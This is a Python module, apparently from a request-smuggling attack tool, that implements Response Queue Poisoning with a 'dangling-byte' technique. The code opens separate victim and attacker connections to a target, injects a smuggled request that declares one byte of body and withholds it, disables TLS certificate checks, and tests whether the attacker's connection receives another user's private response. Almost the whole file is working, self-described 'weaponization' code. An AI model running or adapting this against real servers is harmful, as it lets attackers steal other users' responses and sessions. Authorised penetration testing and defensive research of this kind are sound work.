"""
Weaponization & Autonomous RQP Engine:
Implements PortSwigger's Dangling-Byte Technique to solve the stacked-response race condition,
and deterministically verifies Response Queue Poisoning (Victim Response Theft).
"""

import re
import socket
import ssl
import time
from typing import Any, Dict, Optional, Tuple

from database import Database


class RQPWeaponizer:
    """
    Executes autonomous Response Queue Poisoning (RQP) using the Dangling-Byte Technique.
    Withholds 1 byte so the back-end connection pauses until the victim request arrives,
    eliminating the front-end connection-reset race condition.
    """

    def __init__(
        self,
        host: str,
        port: int = 80,
        use_tls: bool = False,
        timeout: float = 4.0,
        db: Optional[Database] = None,
    ):
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.db = db

    def _open_connection(self) -> socket.socket:
        raw_sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        if self.use_tls:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            return context.wrap_socket(raw_sock, server_hostname=self.host)
        return raw_sock

    def _send_and_receive(self, sock: socket.socket, data: bytes) -> bytes:
        sock.sendall(data)
        buffer = bytearray()
        sock.settimeout(self.timeout)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buffer.extend(chunk)
                if b"\r\n\r\n" in buffer:
                    header_part, body_part = bytes(buffer).split(b"\r\n\r\n", 1)
                    lower_h = header_part.lower()
                    if b"content-length:" in lower_h:
                        m = re.search(rb"content-length:\s*(\d+)", lower_h)
                        if m and len(body_part) >= int(m.group(1)):
                            break
                    elif b"transfer-encoding: chunked" in lower_h and b"0\r\n\r\n" in body_part:
                        break
        except socket.timeout:
            pass
        except (ConnectionResetError, ConnectionAbortedError):
            pass
        return bytes(buffer)

    def test_dangling_byte_rqp(
        self,
        base_desync_trigger: str,
        smuggled_endpoint: str = "/victim_capture",
    ) -> Tuple[bool, str, Dict[str, Any]]:
        """
        Executes the Dangling-Byte attack primitive:
        1. Injects a smuggled request with Content-Length: 1 (withholding the 1 byte).
        2. Victim sends a request with a secret identifier.
        3. Checks if the victim's request satisfied the dangling byte and whether response queue poisoning succeeded.
        """
        victim_secret_token = f"TOKEN_RESEARCH_LEAK_{int(time.time())}"
        victim_req = (
            f"GET /profile HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"X-Victim-Token: {victim_secret_token}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode("utf-8")

        # Dangling byte smuggled request: Declares Content-Length: 1 but sends 0 body bytes
        dangling_smuggled = (
            f"POST {smuggled_endpoint} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 1\r\n\r\n"
        )

        attack_req_str = base_desync_trigger.replace("target.local", self.host)
        attack_req_str = attack_req_str.replace("$PAYLOAD", dangling_smuggled)
        if "\r\n" not in attack_req_str and "\\r\\n" in attack_req_str:
            try:
                attack_req_str = attack_req_str.encode("utf-8").decode("unicode_escape")
            except Exception:
                attack_req_str = attack_req_str.replace("\\r\\n", "\r\n")
        try:
            attack_req_bytes = attack_req_str.encode("latin-1")
        except UnicodeEncodeError:
            attack_req_bytes = attack_req_str.encode("utf-8", errors="replace")

        try:
            # 1. Establish Victim Connection A
            conn_victim = self._open_connection()
            victim_baseline = self._send_and_receive(conn_victim, victim_req)

            # 2. Fire Dangling Byte Trigger on Attacker Connection B
            conn_attacker = self._open_connection()
            _ = self._send_and_receive(conn_attacker, attack_req_bytes)

            # Pause briefly to allow backend to enter dangling-byte wait state
            time.sleep(0.05)

            # 3. Victim fires request on Connection A (which satisfies the dangling byte on the shared backend pool)
            victim_post_attack = self._send_and_receive(conn_victim, victim_req)

            # 4. Attacker checks if victim's response or state was routed to attacker
            stealer_req = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            ).encode("utf-8")
            attacker_stolen_resp = self._send_and_receive(conn_attacker, stealer_req)

            conn_victim.close()
            conn_attacker.close()

            # Deterministic check: did the victim receive the attacker's smuggled response,
            # or did the attacker receive the victim's private token?
            is_stolen = victim_secret_token.encode() in attacker_stolen_resp
            is_victim_poisoned = (
                b"404 Not Found" in victim_post_attack and smuggled_endpoint.encode() in victim_post_attack
            ) or (b"501 Not Implemented" in victim_post_attack)

            if is_stolen or is_victim_poisoned:
                reason = "Autonomous RQP Confirmed via Dangling-Byte Technique!"
                if is_stolen:
                    reason += " [Victim Response Stolen by Attacker]"
                if is_victim_poisoned:
                    reason += " [Victim Connection De-Synchronized to Smuggled Endpoint]"

                return True, reason, {
                    "victim_baseline": victim_baseline.decode("latin-1", errors="replace"),
                    "victim_post_attack": victim_post_attack.decode("latin-1", errors="replace"),
                    "attacker_stolen": attacker_stolen_resp.decode("latin-1", errors="replace"),
                }

            return False, "Dangling-byte request sent, but no response queue theft detected", {}

        except Exception as e:
            return False, f"RQP Weaponizer error: {e}", {}
